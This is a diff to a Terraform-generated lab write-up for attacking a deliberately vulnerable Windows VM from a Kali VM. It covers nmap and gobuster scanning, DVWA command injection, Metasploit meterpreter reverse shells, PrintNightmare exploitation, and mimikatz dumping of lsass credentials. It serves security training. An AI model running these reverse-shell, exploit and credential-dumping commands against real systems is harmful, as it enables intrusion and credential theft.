@@ -21,10 +21,33 @@ output "hack_write_up" {
   value = <<EOT
 # Hack Windows machine
 
+## Check Logins
+
 - login to your Kali machine
 
 ```bash
-ssh kali@${module.kali.public_ip}
+ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
+
+password: ${random_string.suffix.result}
+```
+
+- login to your Windows machine
+
+```bash
+xfreerdp /u:Administrator /v:${module.windows-instance.public_ip}:3389 /h:2048 /w:2048 /p:'Password1!'
+```
+
+- RDPs Client like:
+  - Linux: xfreerdp, rdesktop
+  - Windows: mstsc
+  - MAC OSX: Microsoft Remote Desktop (Appstore)
+
+## Install necessary tools
+
+- login to your Kali machine
+
+```bash
+ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
 
 password: ${random_string.suffix.result}
 ```
@@ -40,11 +63,15 @@ sudo apt install -y wordlists gobuster dirsearch metasploit-framework golang pat
 
 - scan your windows target with nmap
 
+```bash
 nmap -A ${module.windows-instance.private_ip}
+```
 
 ## dir buster
 
+```bash
 gobuster dir -u http://${module.windows-instance.private_ip}:8080 -w /usr/lib/python3/dist-packages/dirsearch/db/dicc.txt -q
+```
 
 ## brute force login
 
@@ -106,7 +133,7 @@ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
 nuclei -u http://${module.windows-instance.private_ip}:8080/dvwa
 ```
 
-## Exploit command injectionin WebApp
+## Exploit command injection in WebApp
 
 - login to the DVWA WebApp `http://${module.windows-instance.public_ip}:8080/dvwa` with with username `admin` and password `password`
 - go to the Command Injection `http://${module.windows-instance.public_ip}:8080/dvwa/vulnerabilities/exec`
@@ -151,7 +178,7 @@ ruby -run -ehttpd . -p8001
 - login via another console to your Kali machine
 
 ```bash
-ssh kali@${module.kali.public_ip}
+ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
 
 password: ${random_string.suffix.result}
 ```
@@ -170,8 +197,15 @@ msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reve
 
 - now you got a meterpreter reverse shell
 - to get a shell just type `shell`
+- continue with the mimikatz section or get another shell with printnightmare
 
 ## Exploit printnightmare
+
+```bash
+ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
+
+password: ${random_string.suffix.result}
+```
 
 - start metasploit framework on the kali vm
 
@@ -189,6 +223,8 @@ msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPASS mondoo.c
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set payload windows/x64/shell_reverse_tcp
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run
 ```
+
+- continue with the mimikatz section
 
 ## mimikatz
 
@@ -222,7 +258,7 @@ PS C:\windows\temp> cd mimikatz_trunk\x64
 cd mimikatz_trunk\x64
 ```
 
-- start mimikatz and dump credentials from windows `lsass.exe` process
+- start mimikatz and dump credentials from windows `lsass.exe` process with `sekurlsa::msv`
 
 ```powershell
 PS C:\windows\temp\mimikatz_trunk\x64> .\mimikatz.exe
@@ -253,7 +289,7 @@ SID               : S-1-5-21-2073652273-2496418537-3488842278-500
 .......
 ```
 
-- use the web page [https://crackstation.net/](https://crackstation.net/) to crack the NTLM-hash of the Administrator
+- use the web page [https://crackstation.net/](https://crackstation.net/) to crack (get clear text password) the NTLM-hash of the Administrator
 
 # Logins
 
@@ -268,7 +304,7 @@ kali: ${random_string.suffix.result}
 ssh command:
 
 ```bash
-ssh kali@${module.kali.public_ip}
+ssh -o StrictHostKeyChecking=no kali@${module.kali.public_ip}
 ```
 
 privat ip:
